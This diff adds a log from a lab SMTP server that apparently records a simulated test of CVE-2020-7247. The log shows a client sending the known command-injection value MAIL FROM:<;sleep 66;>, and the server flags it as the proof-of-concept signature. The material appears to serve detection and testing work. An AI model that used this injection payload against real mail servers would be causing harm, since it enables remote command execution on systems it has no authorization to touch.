@@ -1,0 +1,23 @@
+[13:43:50.738] [SMTP] listening on 10.230.30.25:25
+[13:44:18.112] [SMTP] connection from 172.22.0.1:57635
+[13:44:18.113] [SMTP] TX b'220 vulnerable-smtp.lab ESMTP LabSMTP-1.0\r\n'
+[13:44:18.116] [SMTP] RX b'EHLO attacker.lab\r\n'
+[13:44:18.117] [SMTP] TX b'250-vulnerable-smtp.lab\r\n'
+[13:44:18.117] [SMTP] TX b'250-VRFY\r\n'
+[13:44:18.117] [SMTP] TX b'250 HELP\r\n'
+[13:44:18.176] [SMTP] RX b'MAIL FROM:<;sleep 66;>\r\n'
+[13:44:18.176] [SMTP] [CVE-2020-7247] Qualys/Openwall PoC signature reached: MAIL FROM:<;sleep 66;>
+[13:44:18.176] [SMTP] [EXPLOIT-SIMULATED] Remote service exploitation reached through victim proxy
+[13:44:18.176] [SMTP] TX b'250 CVE-2020-7247 lab marker accepted\r\n'
+[13:44:18.177] [SMTP] RX b'RCPT TO:<root@vulnerable-smtp.lab>\r\n'
+[13:44:18.177] [SMTP] TX b'250 OK\r\n'
+[13:44:18.179] [SMTP] RX b'DATA\r\n'
+[13:44:18.179] [SMTP] TX b'354 End data with <CR><LF>.<CR><LF>\r\n'
+[13:44:18.180] [SMTP] RX b'Subject: CVE-2020-7247 lab\r\n'
+[13:44:18.232] [SMTP] RX b'\r\n'
+[13:44:18.232] [SMTP] RX b'benign lab message\r\n'
+[13:44:18.232] [SMTP] RX b'.\r\n'
+[13:44:18.232] [SMTP] DATA body received with 3 line(s)
+[13:44:18.232] [SMTP] TX b'250 CVE-2020-7247 simulated exploitation recorded\r\n'
+[13:44:18.233] [SMTP] RX b'QUIT\r\n'
+[13:44:18.233] [SMTP] TX b'221 Bye\r\n'
